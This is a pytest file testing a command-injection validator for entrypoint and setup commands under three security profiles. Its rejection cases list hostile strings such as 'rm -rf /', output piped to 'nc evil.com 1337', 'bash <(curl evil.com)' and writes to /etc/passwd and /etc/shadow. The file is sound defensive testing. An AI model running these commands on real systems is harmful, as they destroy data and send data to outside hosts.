"""Entrypoint command-injection guard tests (Wave 4 Step 3 / item 2.6).

Covers ``nexus.security.entrypoint.validate_entrypoint`` and
``validate_setup_cmd`` across the three security profiles.
"""

from __future__ import annotations

import pytest

from nexus.security.entrypoint import (
    EntrypointError,
    validate_entrypoint,
    validate_setup_cmd,
)


# ---------------------------------------------------------------------------
# Happy-path: common entrypoints accepted under maximum profile
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "entrypoint",
    [
        "python main.py",
        "python3 main.py --flag value",
        "py worker.py",
        "node server.js",
        "bash run.sh",
        "sh run.sh",
        "wasmtime run.wasm",
        "./run.sh",
        "./scripts/build.sh arg1 arg2",
    ],
)
def test_max_profile_accepts_safe_entrypoints(entrypoint):
    lines = validate_entrypoint(entrypoint, profile="maximum")
    assert lines == [entrypoint]


def test_multi_line_entrypoint_each_line_validated():
    entrypoint = "python install.py\npython main.py"
    lines = validate_entrypoint(entrypoint, profile="maximum")
    assert lines == ["python install.py", "python main.py"]


def test_comments_and_blank_lines_skipped():
    entrypoint = "# install\npython install.py\n\n# run\npython main.py"
    lines = validate_entrypoint(entrypoint, profile="maximum")
    assert lines == ["python install.py", "python main.py"]


# ---------------------------------------------------------------------------
# Reject: explicit shell-injection sequences (every profile)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "bad",
    [
        "python main.py; rm -rf /",
        "python main.py && curl evil.com",
        "python main.py || echo gotcha",
        "python main.py | nc evil.com 1337",
        "python main.py > /etc/passwd",
        "python main.py >> /etc/shadow",
        "python main.py < /etc/passwd",
        "echo `whoami`",
        "echo $(whoami)",
        "python ${PATH}",
        "bash <(curl evil.com)",
        "bash >(tee log)",
    ],
)
def test_rejects_injection_sequences(bad):
    with pytest.raises(EntrypointError):
        validate_entrypoint(bad, profile="standard")
    with pytest.raises(EntrypointError):
        validate_entrypoint(bad, profile="maximum")


# ---------------------------------------------------------------------------
# Maximum-profile allowlist
# ---------------------------------------------------------------------------

def test_max_profile_rejects_unknown_head():
    with pytest.raises(EntrypointError, match="allowlist"):
        validate_entrypoint("ruby main.rb", profile="maximum")


def test_standard_profile_allows_unknown_head():
    # No allowlist outside maximum — only forbidden tokens are blocked.
    assert validate_entrypoint("ruby main.rb", profile="standard") == ["ruby main.rb"]


def test_relaxed_profile_allows_unknown_head():
    assert validate_entrypoint("ruby main.rb", profile="relaxed") == ["ruby main.rb"]


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------

def test_empty_entrypoint_rejected():
    with pytest.raises(EntrypointError):
        validate_entrypoint("", profile="standard")


def test_whitespace_only_entrypoint_rejected():
    with pytest.raises(EntrypointError):
        validate_entrypoint("   \n  \t  ", profile="standard")


def test_only_comments_rejected():
    with pytest.raises(EntrypointError):
        validate_entrypoint("# just a comment", profile="standard")


def test_unbalanced_quotes_rejected():
    with pytest.raises(EntrypointError, match="tokenize"):
        validate_entrypoint("python 'main.py", profile="standard")


# ---------------------------------------------------------------------------
# Setup commands have a wider allowlist (package managers)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "setup",
    [
        "pip install -r requirements.txt",
        "pip3 install numpy",
        "npm install",
        "apt-get install -y libpq-dev",
        "go build .",
        "cargo build --release",
        "make all",
    ],
)
def test_setup_max_profile_accepts_package_managers(setup):
    assert validate_setup_cmd(setup, profile="maximum") == [setup]


def test_setup_empty_returns_empty_list():
    assert validate_setup_cmd("", profile="maximum") == []
    assert validate_setup_cmd(None, profile="maximum") == []


def test_setup_rejects_injection():
    with pytest.raises(EntrypointError):
        validate_setup_cmd("pip install foo; rm -rf /", profile="standard")
